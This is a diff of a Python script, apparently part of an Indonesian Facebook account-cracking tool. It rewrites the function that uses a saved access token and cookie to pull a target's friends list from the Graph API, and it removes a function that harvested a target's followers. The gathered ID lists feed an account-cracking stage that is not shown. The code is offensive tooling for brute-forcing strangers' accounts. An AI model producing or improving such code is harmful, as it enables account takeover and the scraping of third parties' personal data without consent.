@@ -307,52 +307,20 @@ def result():
 		exit()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def nge_krek1():
-		try:
-		token = open('.token.txt','r').read()
-		kukis = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
-	pil = input(f' ╰─  Masukan ID Target : ')
-	try:
-		params = {
-			"access_token": token,
-			"fields": "name,friends.fields(id,name,birthday)"
-		}
-		graph = ses.get(f"https://graph.facebook.com/{pil}",params = params,cookies = {'kukis': kukis}).json()
-		for x in graph["friends"]["data"]:
-			id.append(x["id"]+"|"+x["name"])
-		print('')
-		print(f' ╰─  Total ID yang Terkumpul : {h}'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(' ╰─  Internet Lu Gak Ada Anjing')
-		exit()
-	except (KeyError,IOError):
-		print(' ╰─  Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
-		exit()
-#-------------------[ CRACK-PENGIKUT ]----------------#
-def dump_pengikut():
-	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
-	pil = input('>> Masukkan Idz Target : ')
-	try:
-		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
-		for pi in koh2['subscribers']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print('>> Koneksi Internet Bermasalah ')
-		exit()
-	except (KeyError,IOError):
-		print('>> Gagal Mengambil Target ')
-		exit()
+		a = input('╰─  masukan id target: ')
+		try:
+			params = {
+			"access_token": token, 
+			"fields": "name,friends.fields(id,name,birthday)"
+			}
+			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+			for c in b["friends"]["data"]:
+				id.append(c["id"]+"|"+c["name"])
+			print(' 🔥 : {}'.format(len(id)));setting()
+		except Exception as e:
+		    print (e)
 #------------------[ CRACK-GRUP ]-----------------#
 balmond = b+"["+h+"✓"+b+"]"
 
